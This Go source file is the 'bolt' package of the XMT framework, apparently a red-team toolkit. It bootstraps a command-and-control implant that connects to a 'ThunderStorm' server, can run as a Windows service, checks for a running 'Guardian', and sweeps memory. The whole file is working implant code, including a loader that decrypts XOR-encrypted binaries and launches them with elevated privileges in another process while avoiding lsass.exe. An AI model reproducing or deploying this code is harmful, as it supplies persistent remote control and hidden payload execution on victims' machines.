// Copyright (C) 2021 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package bolt

import (
	"context"
	"os/signal"
	"syscall"
	"time"

	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/device/devtools"
	"github.com/iDigitalFlame/xmt/man"
	"github.com/iDigitalFlame/xmt/util"
)

// Service will start the supplied function as a Windows service instead of
// directly launching it.
//
// It will be run once on startup and after every 'd' timeframe.
func Service(d time.Duration, f func()) {
	if d < 0 {
		return
	}
	(&devtools.Service{Start: f, Exec: f, Interval: d}).Run()
}

// Start will bootstrap and start a Bolt.
//
// The initial boolean will determine if this will respect the Global bolt
// Guardian (if guard is not Empty). If true, this bolt will exit if another
// Guardian is currently running.
//
// The two strings 'server' and 'guard' control the connection to ThunderStorm.
// If 'guard' is empty, this Bolt will ignore and will not attempt to configure
// a Guardian.
//
// The byte array provided is the C2 Profile Config specified and will determine
// how the Bolt connects to ThunderStorm.
//
// This function does NOT return any values and WILL BLOCK while running. If
// 'server' or the config byte array are empty, this function fails and returns
// instantly.
func Start(x bool, server, guard string, c []byte) {
	StartEx(x, guard, server, c, nil, nil)
}

// Launch will start the process of locating and triggering a Guardian.
//
// If a Guardian is not detected, this function will attempt to start a Bolt
// instance from the provided binary file DB list supplied.
func Launch(guardian string, files []string, key []byte) {
	LaunchEx(guardian, files, key, nil, nil)
}

// StartEx will bootstrap and start a Bolt.
//
// The initial boolean will determine if this will respect the Global bolt
// Guardian (if guard is not Empty). If true, this bolt will exit if another
// Guardian is currently running.
//
// The two strings 'server' and 'guard' control the connection to ThunderStorm.
// If 'guard' is empty, this Bolt will ignore and will not attempt to configure
// a Guardian.
//
// The byte array provided is the C2 Profile Config specified and will determine
// how the Bolt connects to ThunderStorm.
//
// This extended function call allows for specification of functions to be called
// before start-up and on completion (if not nil).
//
// This function does NOT return any values and WILL BLOCK while running. If
// 'server' or the config byte array are empty, this function fails and returns
// instantly.
func StartEx(ign bool, guard, server string, c []byte, start, end func()) {
	if len(server) == 0 {
		return
	}
	var (
		p, err = cfg.Raw(c)
		g      *man.Guardian
	)
	if err != nil {
		return
	}
	if len(guard) > 0 {
		if g, err = man.Guard(man.Event, guard); !ign && err != nil {
			return
		} else if g != nil {
			defer g.Close()
		}
	}
	x, f := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	s, err := c2.Default.ConnectContext(x, server, nil, p)
	if limits.Ignore(); err != nil {
		return
	}
	if limits.MemorySweep(); start != nil {
		start()
	}
	s.Shutdown = func(_ *c2.Session) {
		if s.Close(); g != nil {
			g.Close()
		}
	}
	s.Wait()
	if f(); end != nil {
		end()
	}
}

// LaunchEx will start the process of locating and triggering a Guardian.
//
// If a Guardian is not detected, this function will attempt to start a Bolt
// instance from the provided binary file DB list supplied.
//
// This extended function call allows for specification of functions to be
// called before start-up and on completion (if not nil).
func LaunchEx(guard string, files []string, key []byte, start, end func()) {
	if len(files) == 0 {
		return
	}
	if start != nil {
		start()
	}
	if man.Check(man.Event, guard) {
		return
	}
	var x crypto.XOR
	if len(key) > 0 {
		x = crypto.XOR(key)
	}
	for i, f := 0, cmd.B(true).SetElevated(true).SetSession(false).SetExclude("lsass.exe"); i < 5; i++ {
		s, err := man.Crypt(x, files[util.FastRandN(len(files))])
		if err != nil {
			continue
		}
		s.Filter = f
		if _, err = s.Check(man.Event, guard); err == nil {
			break
		}
	}
	if end != nil {
		end()
	}
}
